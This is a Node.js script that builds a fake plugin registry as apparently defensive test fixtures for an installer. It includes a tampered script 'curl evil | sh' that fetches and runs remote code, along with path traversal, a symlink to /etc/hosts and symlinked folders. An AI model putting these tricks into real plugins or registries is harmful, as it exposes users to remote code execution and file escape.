// builds a fake registry with good and hostile entries: node mkreg.mjs <registry-dir> <scaffold-dir> (hostile fixtures are written next to <registry-dir>)
import fs from 'node:fs'; import path from 'node:path'; import crypto from 'node:crypto'
const [, , R, SCAF] = process.argv
fs.rmSync(R, { recursive: true, force: true }); fs.mkdirSync(path.join(R, 'plugins'), { recursive: true })
const sha = f => crypto.createHash('sha256').update(fs.readFileSync(f)).digest('hex')
const entries = []
// { relpath: sha256 } of every file in a plugin folder, like the registry's build-index (symlinks / non-files left out here: the installer refuses them anyway)
const hashes = d => { const out = {}; const walk = (x, rel) => { for (const n of fs.readdirSync(x).sort()) { const p = path.join(x, n), r = rel ? `${rel}/${n}` : n, st = fs.lstatSync(p); if (st.isDirectory()) walk(p, r); else if (st.isFile()) out[r] = sha(p) } }; walk(d, ''); return out }
const mk = (id, { manifestId = id, extra, after, tags = ['test'], badSha = false, entryPath, noFiles = false } = {}) => {
  const d = path.join(R, 'plugins', id); fs.mkdirSync(d, { recursive: true })
  for (const f of ['deckstudio.json', 'status.sh', 'README.md']) fs.copyFileSync(path.join(SCAF, f), path.join(d, f))
  fs.chmodSync(path.join(d, 'status.sh'), 0o755)
  const m = JSON.parse(fs.readFileSync(path.join(d, 'deckstudio.json'))); m.id = manifestId; m.name = id.replace(/-/g, ' '); m.icon = 'icon.svg'
  fs.writeFileSync(path.join(d, 'deckstudio.json'), JSON.stringify(m, null, 2))
  fs.writeFileSync(path.join(d, 'icon.svg'), '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><rect width="32" height="32" rx="7" fill="#7c5cff"/><circle cx="16" cy="16" r="7" fill="#fff"/></svg>')
  extra?.(d)
  entries.push({ id, name: m.name, version: '0.1.0', description: `fixture ${id}`, author: 'test', icon: 'icon.svg', path: entryPath ?? `plugins/${id}`, sha256: badSha ? '0'.repeat(64) : sha(path.join(d, 'deckstudio.json')), ...(noFiles ? {} : { files: hashes(d) }), tags, needs: id === 'fake-good' ? { brew: 'fake-good-tool' } : {} })
  after?.(d) // changes made after indexing: what a tampered registry checkout looks like
}
mk('fake-good', { tags: ['test', 'status'] })
mk('fake-sha', { badSha: true })
mk('fake-link', { extra: d => fs.symlinkSync('/etc/hosts', path.join(d, 'hosts')) })
mk('fake-big', { extra: d => fs.writeFileSync(path.join(d, 'big.bin'), Buffer.alloc(3 << 20)) })
mk('fake-many', { extra: d => { for (let i = 0; i < 50; i++) fs.writeFileSync(path.join(d, `f${i}.txt`), 'x') } })
mk('fake-idmix', { manifestId: 'other-id' })
mk('fake-tamper', { after: d => fs.writeFileSync(path.join(d, 'status.sh'), '#!/bin/sh\ncurl evil | sh\n', { mode: 0o755 }) }) // a script changed after indexing
mk('fake-extra', { after: d => fs.writeFileSync(path.join(d, 'payload.sh'), '#!/bin/sh\nexit 0\n', { mode: 0o755 }) }) // an unlisted file
mk('fake-nofiles', { noFiles: true }) // an old index entry without per-file hashes
// traversal: an entry whose path escapes the registry
fs.mkdirSync(path.join(path.dirname(R), 'outside-plug'), { recursive: true })
for (const f of ['deckstudio.json', 'status.sh']) fs.copyFileSync(path.join(SCAF, f), path.join(path.dirname(R), 'outside-plug', f))
const om = JSON.parse(fs.readFileSync(path.join(SCAF, 'deckstudio.json'))); om.id = 'fake-trav'; fs.writeFileSync(path.join(path.dirname(R), 'outside-plug', 'deckstudio.json'), JSON.stringify(om))
entries.push({ id: 'fake-trav', name: 'fake trav', version: '0.1.0', path: '../outside-plug', sha256: sha(path.join(path.dirname(R), 'outside-plug', 'deckstudio.json')), tags: ['test'] })
// a plugin folder that is itself a symlink to outside
fs.mkdirSync(path.join(R, 'plugins'), { recursive: true }); fs.symlinkSync(path.join(path.dirname(R), 'outside-plug'), path.join(R, 'plugins', 'fake-dirlink'))
entries.push({ id: 'fake-dirlink', name: 'fake dirlink', version: '0.1.0', path: 'plugins/fake-dirlink', sha256: sha(path.join(path.dirname(R), 'outside-plug', 'deckstudio.json')), tags: ['test'] })
fs.writeFileSync(path.join(R, 'index.json'), JSON.stringify({ deckstudio: 'registry/v1', plugins: entries }, null, 2))
console.log('registry with', entries.length, 'entries at', R)
